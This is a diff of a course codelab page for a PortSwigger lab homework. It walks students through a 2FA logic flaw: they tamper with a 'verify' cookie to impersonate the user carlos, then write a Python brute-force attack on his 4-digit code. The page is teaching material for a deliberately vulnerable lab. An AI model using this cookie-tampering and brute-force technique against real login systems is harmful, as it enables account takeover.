@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
 <meta name="theme-color" content="#4F7DC9">
 <meta charset="UTF-8">
-<title>1.4: HW1 (2fa-bypass-using-a-brute-force-attack)</title>
+<title>1.4: HW1 (2fa-broken-logic)</title>
 <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
 <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
 <link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
@@ -14,14 +14,24 @@
 </head>
 <body>
 <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
-<google-codelab codelab-gaid="" id="W1.4_hw1" title="1.4: HW1 (2fa-bypass-using-a-brute-force-attack)" environment="web" feedback-link="https://docs.google.com/document/d/17FL7FOT6naN1I-u4Cvo6A88sZSpsZ9P2gqS0OxojSR0">
+<google-codelab codelab-gaid="" id="W1.4_hw1" title="1.4: HW1 (2fa-broken-logic)" environment="web" feedback-link="https://docs.google.com/document/d/1uQIeFcj_Ojx91tu8o97pUhmKmdnOkbBosftNfVjaDCk">
 <google-codelab-step label="authentication/multi-factor" duration="5">
-<h2 is-upgraded><a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack" target="_blank">2fa-bypass-using-a-brute-force-attack</a></h2>
-<p>In this level, the login process is protected by a 2-factor authentication flow. Once a user submits a correct set of credentials to the <code>/login</code> path, they are redirected to the <code>/login2</code> path that handles the second factor. Upon visiting the <code>/login2</code> path, a 2FA code to be emailed to the user. The <code>/login2</code> page implements a form that the user then fills with the 2FA code. The main flaw is that the handler for the 2FA form is not rate-limited to prevent brute-force attacks.</p>
-<p>You are initially given credentials to the victim&#39;s account (<code>carlos:montoya</code>), however, you do not have access to the email address of the victim and can not determine the 2FA code that is sent upon logging in as the victim. To attack the level, you will need to perform a brute-force attack on <code>carlos</code>&#39;s 2FA code. In order for the attack to be efficient, you will need to use <code>multiprocessing</code> or <code>asyncio</code> to perform the brute-force attack. </p>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic" target="_blank">2fa-broken-logic</a></h2>
+<p>In this level, the login process is protected by a 2-factor authentication flow. Once a user submits a correct set of credentials to the <code>/login</code> path, they are redirected via HTTP to the <code>/login2</code> path that handles the second factor. As part of the redirection, an HTTP cookie named &#39;<code>verify</code>&#39; is set that is used to identify the authenticated user to the <code>/login2</code> path. Visiting the <code>/login2</code> path with this cookie will cause a 2FA code to be emailed to the user specified in the cookie. The <code>/login2</code> page implements a form that the user then fills with the 2FA code. Successful submission of the code logs the user in.</p>
+<p>There are several main flaws with the process:</p>
+<ul>
+<li>It is assumed that one can only visit <code>/login2</code> via a redirection after a legitimate login. Unfortunately, this assumption fails as one can visit the <code>/login2</code> path directly.</li>
+<li>It is assumed that the user has not tampered with the <code>verify</code> cookie and that only a user who has submitted a correct set of credentials can request a 2FA code.</li>
+<li>The handler for the 2FA form is not rate-limited to prevent brute-force attacks.</li>
+</ul>
+<p>To attack the process, you will:</p>
+<ul>
+<li>Login with the legitimate account (<code>wiener:peter</code>), but instead of following the redirect to <code>/login2</code> with the given cookie, you will modify the cookie to bind it to the user <code>carlos</code> instead. This will send the 2FA code to <code>carlos</code>. </li>
+<li>Perform a brute-force attack on <code>carlos</code>&#39;s 2FA code using <code>multiprocessing</code> or <code>asyncio</code> to efficiently perform the brute-force attack. Note that while there are 10000 4-digit codes possible, the level restricts codes to be between 0000 and 2000.</li>
+</ul>
 </google-codelab-step>
 <google-codelab-step label="Python environment" duration="2">
-<p>You will be writing your attack in Python using the <code>requests</code> and <code>BeautifulSoup</code> packages.</p>
+<p>You will be writing your attack in Python using the <code>requests</code> and <code>BeautifulSoup</code> packages. </p>
 <ul>
 <li>In your course repository, create the directory below and <code>cd</code> into it.</li>
 </ul>
@@ -41,72 +51,95 @@ source env/bin/activate
 pip install -r requirements.txt</code></pre>
 </google-codelab-step>
 <google-codelab-step label="Initial program" duration="5">
-<p>Create an initial Python script using the code below called <code>hw1.py</code> that programmatically logs in as <code>carlos:montoya</code>, requests a 2FA code, and then submits the code &#39;<code>0000</code>&#39; in an attempt to successfully log-in. </p>
-<p>The program begins by visiting the login page and obtaining the <code>csrf</code> token of the login form.</p>
+<p>Create an initial Python script using the code below called <code>hw1.py</code> that programmatically logs in as <code>wiener:peter</code>, requests a 2FA code, checks <code>wiener</code>&#39;s e-mail for the code, and then submits the code to successfully log-in. </p>
+<p>The program begins by visiting the login page and obtaining the &#34;Exploit Link&#34; which is used to access the email of a particular user to get the 2FA code. Note that we won&#39;t need this link in our attack as we&#39;ll be brute-forcing the code.</p>
 <h2 is-upgraded>hw1.py</h2>
-<p>We begin by taking a single argument from the command line that contains the URL of our Portswigger level. To do so, we import Python&#39;s sys package and read in the first command-line argument with it (<code>sys.argv[1]</code>). If the full URL is given, we strip off the outer parts of it so that we get just the <code>site</code>&#39;s hostname.</p>
 <pre><code>import sys
+import requests
+import re
+from bs4 import BeautifulSoup
+
 site = sys.argv[1]
 if &#39;https://&#39; in site:
-    site = site.rstrip(&#39;/&#39;).lstrip(&#39;https://&#39;)</code></pre>
-<p>Next, we instantiate a session and get the login page for the level. Note that this level is protected with a csrf token hidden in the form field. The program uses BeautifulSoup to parse this out.</p>
-<pre><code>s = requests.Session()
+    site = site.rstrip(&#39;/&#39;).replace(&#39;https://&#39;,&#39;&#39;)
+
+s = requests.Session()
 login_url = f&#39;https://{site}/login&#39;
 resp = s.get(login_url)
 soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
-csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)</code></pre>
-<p>Then, the program creates a dictionary containing the user credentials we&#39;re given and submits it to the login form along with the <code>csrf</code> token. </p>
+email_url = soup.find(&#39;a&#39;, {&#39;id&#39;:&#39;exploit-link&#39;}).get(&#39;href&#39;)</code></pre>
+<p>Then, we create a dictionary containing the user credentials we&#39;re given and submit it to the login form. We set the keyword argument <code>allow_redirects</code> in our POST request to <code>false</code> so we can examine the redirect response. In this case, the response code (<code>resp.status_code</code>) is printed out along with the <code>verify</code> cookie that is set in the session as part of the response. </p>
 <pre><code>logindata = {
-    &#39;csrf&#39; : csrf,
-    &#39;username&#39; : &#39;carlos&#39;,
-    &#39;password&#39; : &#39;montoya&#39;
+    &#39;username&#39; : &#39;wiener&#39;,
+    &#39;password&#39; : &#39;peter&#39;
 }
-print(f&#39;Logging in as carlos:montoya&#39;)
-resp = s.post(login_url, data=logindata)
-print(f&#39;Login response: {resp.text}&#39;)</code></pre>
-<p>Upon successful login, an HTTP redirect is given that automatically sends us to the <code>/login2</code> page that implements the 2FA process. As part of this process, a 2FA code is automatically sent to the email address of the account which is not accessible. The <code>/login2</code> form also has a <code>csrf</code> token we&#39;ll need to include for when we submit the code. </p>
-<pre><code>soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
-csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)</code></pre>
-<p>Finally, we attempt to submit &#39;0000&#39; as the 2FA code and view the response. The code for doing so is shown below. As the code shows, we must zero-pad the number to 4 digits via <code>zfill</code>. We then POST the code to the <code>/login2</code> path, but we specify that the keyword argument <code>allow_redirects</code> is false. This prevents Python requests from automatically following an HTTP redirect. For this authentication workflow, a redirect to the landing page indicates a successful login. We can check for this via the response&#39;s <code>status_code</code>.</p>
-<pre><code>login2_url = f&#39;https://{site}/login2&#39;
+print(f&#39;Logging in as wiener:peter with allow_redirects=False&#39;)
+resp = s.post(login_url, data=logindata, allow_redirects=False)
+print(f&#39;Response status_code: {resp.status_code}&#39;)
+print(f&#39;Response headers show that username part of cookie sent to a redirect /login2 {resp.headers}&#39;)
+print(f&#34;Session cookies are now: {s.cookies[&#39;verify&#39;]}&#34;)</code></pre>
+<p>Next, we visit the URL given in the redirection (<code>/login2</code>) to get the 2FA code emailed to us. </p>
+<pre><code>print(f&#39;Visit /login2 now as wiener:peter to get 2FA code sent via email, then retrieve it :&#39;)
+login2_url = f&#39;https://{site}/login2&#39;
+resp = s.get(login2_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)</code></pre>
+<p>We next visit our &#34;email&#34; and pull out the 4-digit 2FA code that has been sent.</p>
+<pre><code>print(f&#39;Getting 2FA from email url {email_url} :&#39;)
+resp = s.get(email_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+email = soup.find(&#39;pre&#39;).text
+code = re.split(&#39;[ \.]&#39;,email)[4]
+print(f&#39;Code is {code}&#39;)</code></pre>
+<p>We then construct a dictionary to submit the code to <code>/login2</code> in order to complete our authentication. The code checks for success by again examining the HTTP status code to ensure it is a redirection that sends us to the landing page. Finally, we visit our account profile page (<code>/my-account?id=wiener</code>) to validate our successful authentication.</p>
+<pre><code>print(f&#39;Now use it to post mfa-code to /login2 :&#39;)
 login2data = {
-    &#39;csrf&#39; : csrf,
-    &#39;mfa-code&#39; : str(0).zfill(4)
+        &#39;mfa-code&#39; : code
 }
 resp = s.post(login2_url, data=login2data, allow_redirects=False)
+
 if resp.status_code == 302:
     print(f&#39;2fa valid with response code {resp.status_code}&#39;)
-    # Visit account profile page to complete level
-else:
-    print(f&#39;2fa invalid with response code: {resp.status_code}&#39;)</code></pre>
-<p>After finding the correct code, we can then visit <code>carlos</code>&#39;s account profile page (<code>/my-account?id=carlos</code>) to solve the level.</p>
-<p>Note that the web application only allows 2 incorrect guesses of the code before requiring the user to login again. As a result, you will need to login again to attempt subsequent codes in your program.</p>
+    print(f&#39;Redirect to landing page with headers {resp.headers}&#39;)
+print(f&#39;Grab My Account page for wiener:&#39;)
+account_url = f&#39;https://{site}/my-account?id=wiener&#39;
+resp = s.get(account_url)
+print(resp.text)</code></pre>
 </google-codelab-step>
 <google-codelab-step label="Run the program" duration="5">
-<p>Run the program on your site to show that you can login with the given account credentials to get to the 2FA page, but that the 2FA submission fails.</p>
-<pre>python hw1.py &lt;Level_URL&gt;
+<p>Run the program on your site to show that you can login with the given account credentials.</p>
+<pre>python hw1.py https://.../
 ...
-&lt;form class=login-form method=POST&gt;
-    &lt;input required type=&#34;hidden&#34; name=&#34;csrf&#34; value=&#34;53...K&#34;&gt;
-    &lt;label&gt;Please enter your 4-digit security code&lt;/label&gt;
-    &lt;input required type=text name=mfa-code&gt;
-    &lt;button class=button type=submit&gt; Login &lt;/button&gt;
-&lt;/form&gt;
-...
-2fa invalid with response code: 200</pre>
-<p>Then, add, commit and push this initial script and its <code>requirements.txt</code> into your repository</p>
+   &lt;h1&gt;My Account&lt;/h1&gt;
+   &lt;div id=account-content&gt;
+      &lt;p&gt;Your username is: wiener&lt;/p&gt;
+      &lt;p&gt;Your email is: wiener@a...web-security-academy.net&lt;/p&gt;
+...</pre>
+<p>Then, add, commit and push this initial script and its <code>requirements.txt</code> into your repository. </p>
 <pre><code>git add .
 git commit -m &#34;Initial script&#34;
 git push</code></pre>
 <p>Ensure that your local Python environment in <code>env</code> has not been added to the repository. It will be ignored as long as you&#39;ve properly included it in the <code>.gitignore</code> file as instructed when you set up your course <code>git</code> repository.</p>
 </google-codelab-step>
+<google-codelab-step label="Cookie tampering" duration="10">
+<p>The website has a vulnerability in that the <code>/login2</code> path assumes that the user specified in the &#39;<code>verify</code>&#39; cookie has already authenticated with their password. Unfortunately, the client browser can modify this cookie. We will be modifying the Python program to tamper with the cookie that is returned from the site in order to impersonate the <code>carlos</code> account. Doing so will send a 2FA code to <code>carlos</code> that we can then brute-force in order to login as <code>carlos</code>. An example of deleting the cookie from your session and creating a new cookie (specifying the cookie&#39;s domain, name, and value) is shown below.</p>
+<pre><code># Delete the verify cookie for wiener
+del s.cookies[&#39;verify&#39;]
+# Create a new one specifying carlos
+cookie_obj = requests.cookies.create_cookie(domain=site, name=&#39;verify&#39;, value=&#39;carlos&#39;)
+# Add cookie to the session
+s.cookies.set_cookie(cookie_obj)</code></pre>
+</google-codelab-step>
 <google-codelab-step label="Python program" duration="120">
-<p>Modify <code>hw1.py</code> to implement a program that performs a brute-force attack on the 2FA code for the account <code>carlos</code> in order to successfully authenticate as the account. While for testing purposes, you can visit the account&#39;s profile page in order to solve the level, please remove this request when submitting your final program. For grading purposes, we need the level to remain unsolved to grade subsequent programs. Instead, modify your program to simply output the 2fa code instead. </p>
+<p>Modify <code>hw1.py</code> to implement a program that issues a 2FA code to the account <code>carlos</code> and then performs a brute-force attack on it to successfully authenticate as the account. Have your program print out the 2FA code that is successful. For testing purposes only, have the program visit the account&#39;s profile page in order to verify you have solved the level. Once verified, for grading purposes, comment out this request out so that it does not automatically solve the grader&#39;s level.</p>
+<p>Note that when brute-forcing the 2FA code, you must supply 4-digits. For smaller numbers, this requires the code to be zero-padded. You can perform this via the <code>zfill()</code> method as done in the code below.</p>
+<pre><code>for i in range(10):
+  print(str(i).zfill(4))</code></pre>
 <h2 is-upgraded>Requirements</h2>
 <ul>
 <li>Commit frequently to your repository in order to record your progress.</li>
+<li>Make sure your program can be run by <code>python hw1.py site_url</code> in a Linux environment and ensure the program only prints out the 2FA code but does not solve the level automatically.</li>
 <li>Make your program concise and modular by defining at least one function that encapsulates a key part of your program. If you find you have deep levels of indentation, consider the use of a function call.</li>
-<li>Throughout the program and especially in function declarations use Python <a href="https://github.com/google/styleguide/blob/gh-pages/pyguide.md" target="_blank">docstrings</a> to specify parameter names and their types as well as provide code documentation for the functionality implemented. An example of a well-documented Python function is shown below </li>
+<li>Throughout the program and especially in function declarations, use Python <a href="https://github.com/google/styleguide/blob/gh-pages/pyguide.md" target="_blank">docstrings</a> to specify parameter names and their types as well as provide code documentation for the functionality implemented. An example of a well-documented Python function is shown below </li>
 </ul>
 <pre><code>def run_test(login, password, url, num_tests):                                  
     &#34;&#34;&#34;Records timing data for an individual attack
@@ -121,10 +154,9 @@ git push</code></pre>
 <h2 is-upgraded>Rubric</h2>
 <ul>
 <li>Program correctness</li>
-<li>Follows the guidelines described above including use of the initial program to derive your solution from. Your program must take the level&#39;s URL as a command-line parameter.</li>
+<li>Follows the guidelines described above</li>
 <li>Reliably and quickly performs the attack using <code>multiprocessing</code> or <code>asyncio</code>.</li>
 <li>Checks for errors as part of its operation</li>
-<li>Finds the correct 2fa code and outputs it, but does not solve the level.</li>
 <li>Program is concise and modular</li>
 <li>Code is documented clearly</li>
 <li>Multiple incremental commits have been made to the git repository as the program has been developed</li>
